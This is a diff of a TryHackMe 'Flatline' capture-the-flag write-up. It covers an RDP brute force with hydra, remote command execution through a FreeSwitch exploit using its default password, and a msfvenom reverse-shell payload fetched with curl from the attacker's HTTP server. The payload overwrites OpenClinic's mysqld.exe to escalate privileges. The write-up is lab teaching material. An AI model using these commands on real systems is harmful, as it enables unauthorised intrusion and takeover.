@@ -16,7 +16,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 253.58 seconds
 ```
-I ran more aggressive scans on each of the ports from the full nmap scan. 
+I ran more aggressive scans on each of the ports from the full nmap scan since I wanted to gather some more information. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nmap -A -p 3389 -Pn [Remote IP]
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-11 07:59 EST
@@ -54,12 +54,12 @@ PORT     STATE SERVICE          VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
 ```
-I started up hydra to brute force a log in with RDP. 
+I started up hydra to brute force a log in with RDP to see what would happen. 
 ```
 hydra -L /home/ajread/resources/wordlists/SecLists/Usernames/Names/names.txt -P /home/ajread/resources/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt [Remote IP]rdp
 ```
-# Enumeration 
-However, it didnt work so I decided to go after the more interesting FreeSwitch service. I found a possible exploitiation with command execution (https://www.exploit-db.com/exploits/47799). I was able to connect to the service with the below command. 
+# Enumeration
+However, it didnt work so I decided to go after the more interesting FreeSwitch service. I found a possible exploitiation with command execution (https://www.exploit-db.com/exploits/47799). According to the exploit, FreeSwitch allow commands to be run after proper authentication. The default password for the service is ```ClueCon```. So, I renamed the exploit to ```freeswitch.py``` and connected to the service with the below command. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] whoami
 Authenticated
@@ -68,6 +68,7 @@ Content-Length: 25
 
 win-eom4pk0578n\nekrotic
 ```
+Therefore, I was able to run any command that I wanted with the ```freeswitch.py``` script that authenticated my socket with the remote service. Looking at the output of ```whoami```, I appear to be running as user on the system. 
 # Initial Access
 I had to do some digging around. But, I eventually found the location of the ```user.txt```. 
 ```
@@ -79,7 +80,7 @@ Content-Length: 38
 [REDACTED]
 ```
 # Privilege Escalation 
-Within the desktop directory of the user, there was a root.txt. 
+Within the desktop directory of the user, I noticed a ```root.txt```. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir C:\Users\Nekrotic\Desktop"
 Authenticated
@@ -98,7 +99,7 @@ Content-Length: 374
                2 File(s)             76 bytes
                2 Dir(s)  50,561,933,312 bytes free
 ```
-I tried to access it but it came up with the following output. 
+I tried to access it but it came up with the following output. Meaning, I was not able to read the txt file or I didnt have the proper permissions. My guess, I didnt have the proper permissions. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "type C:\Users\Nekrotic\Desktop\root.txt"
 Authenticated
@@ -107,7 +108,7 @@ Content-Length: 14
 
 -ERR no reply
 ```
-I navigated to the Administrator home directory and found some interesting output. 
+I navigated to the Administrator home directory and found an interesting executable called OpenClinic. The name of the room is ```Flatline``` so I guessed that this exe has something to do with local privilege escalation, continuing on the medical theme. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir C:\Users\Administrator\Desktop"
 Authenticated
@@ -126,7 +127,9 @@ Content-Length: 449
                2 File(s)    521,632,719 bytes
                2 Dir(s)  50,513,035,264 bytes free
 ```
-There is a local privilege escalation exploit for that version of OpenClinic (https://www.exploit-db.com/exploits/50448). I confirmed the existence and location of the vulnerable ```mysqld.exe```. 
+There was a local privilege escalation exploit for that version of OpenClinic (https://www.exploit-db.com/exploits/50448). In this priv esc, I needed to modify the ```mysqld.exe``` or ```tomcat8.exe``` executables within the ```bin``` directory of ```mariadb``` and restart the OpenClinic service, which would execute the modified executable as system. In summary, exploit targets the ability for any user to modify ```mysqld.exe``` or ```tomcat8.exe``` which run as system. 
+
+To be sure, I confirmed the existence and location of the vulnerable ```mysqld.exe```. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir c:\projects\openclinic\mariadb\bin\mysqld.exe"
 Authenticated
@@ -142,7 +145,7 @@ Content-Length: 263
                1 File(s)         26,600 bytes
                0 Dir(s)  50,526,441,472 bytes free
 ```
-Following the local priv esc exploit, I created the payloard with msfvenom. 
+Following the local priv esc exploit, I created a payload with msfvenom on my local machine. 
 ```
 ajread@aj-ubuntu:~/apps/metasploit-framework$ ./msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP] LPORT=9999 -f exe > /home/ajread/TryHackMe/practice/mysqld_evil.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -162,6 +165,10 @@ ajread@aj-ubuntu:~/TryHackMe/practice$ sudo python -m http.server 80
 [sudo] password for ajread: 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
+I used curl to grab the malicious ```mysqld_evil.exe``` from my local machine. 
+```
+ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP]"curl http://[Local IP]/mysqld_evil.exe -o \"C:\projects\openclinic\mariadb\bin\mysqld_evil.exe\""
+```
 I saw it grab the shell from my server. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ sudo python -m http.server 80
@@ -169,6 +176,7 @@ ajread@aj-ubuntu:~/TryHackMe/practice$ sudo python -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 [Remote IP] - - [14/Mar/2022 19:30:13] "GET /mysqld_evil.exe HTTP/1.1" 200 -
 ```
+I renamed the ```mysqld_evil.exe``` the correct name, ```mysqld.exe```. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "rename C:\projects\openclinic\mariadb\bin\mysqld_evil.exe mysqld.exe"
 Authenticated
